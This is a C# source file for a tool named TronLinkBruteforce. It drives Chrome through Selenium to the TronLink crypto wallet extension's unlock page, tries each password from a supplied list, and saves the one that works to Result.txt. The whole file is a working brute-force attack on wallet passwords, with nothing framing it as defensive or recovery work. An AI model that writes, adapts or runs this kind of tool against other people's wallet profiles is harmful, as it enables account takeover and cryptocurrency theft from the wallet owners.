using System.Diagnostics;
using CommandLine;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;

namespace TronLinkBruteforce;

internal class Program
{
    public static async Task Main(string[] args)
    {
        await Parser.Default.ParseArguments<Options>(args)
            .WithParsedAsync(async o => await ProcessAsync(o));
    }

    private static async Task ProcessAsync(Options options)
    {
        if (options.KillAllChromes)
            foreach (var process in Process.GetProcessesByName("chrome"))
                process.Kill();

        if (!File.Exists(options.ChromePath)) throw new ArgumentException("Cant find chrome path.");
        const string url = "chrome-extension://ibnejdfjmmkpcnlpebklmnkoeoihofec/popup/popup.html#/login";
        var proc = new Process();
        proc.StartInfo.FileName = options.ChromePath;
        proc.StartInfo.Arguments = $"--new-window --remote-debugging-port=9222 --user-data-dir=\"{options.UserDataDir}\"";
        proc.Start();

        var chromeOptions = new ChromeOptions
        {
            DebuggerAddress = "127.0.0.1:9222"
        };
        chromeOptions.AddArgument("no-sandbox");
        chromeOptions.AddArgument("remote-debugging-port=9222");

        var driver = new ChromeDriver(chromeOptions);
        driver.Navigate().GoToUrl(url);
        await Task.Delay(5000);
        var button = driver.FindElement(By.CssSelector("button"));
        var input = driver.FindElement(By.CssSelector("input[type=password]"));

        var passwordFilePath = options.PasswordsPath;
        if (!File.Exists(options.PasswordsPath)) throw new ArgumentException("Cant find path to file with passwords.");
        var lines = await File.ReadAllLinesAsync(passwordFilePath);
        var passwords = lines.Distinct().ToArray();
        var delay = options.Delay;
        var delayForKey = options.BackspaceDelay;

        Console.WriteLine($"Starting {passwords.Length} passwords");

        var i = 0;
        var processed = 0;
        var total = passwords.Length;
        var start = DateTime.UtcNow;
        const int submitProgressEveryNthPassword = 100;
        foreach (var pass in passwords)
        {
            await Task.Delay(delay);
            input.Click();
            await Task.Delay(delay);

            if (options.UseCtrlA)
            {
                input.SendKeys(Keys.Control + "a");
                await Task.Delay(delayForKey);
                input.SendKeys(Keys.Backspace);
            }
            else
            {
                for (var j = 0; j < pass.Length + 1; j++)
                {
                    input.SendKeys(Keys.Backspace);
                    await Task.Delay(delayForKey);
                }
            }

            await Task.Delay(delay);
            input.SendKeys(pass);

            await Task.Delay(delay);
            button.Click();

            var result = driver.FindElement(By.TagName("body")).Text;

            i++;
            processed++;
            if (i == submitProgressEveryNthPassword)
            {
                i = 0;
                var elapsed = DateTime.UtcNow - start;
                var speed = submitProgressEveryNthPassword / elapsed.TotalSeconds;
                var left = total - processed;
                Console.WriteLine($"[{DateTime.Now}] Speed {speed:0.###} PPS, left {left} passwords (estimated {TimeSpan.FromSeconds(left / speed)})");
                start = DateTime.UtcNow;
            }

            if (result.Contains("Wrong password")) continue;

            await File.AppendAllTextAsync("Result.txt", $"---{DateTime.Now}---\n{pass}");
            Console.WriteLine(pass);
            break;
        }
    }
}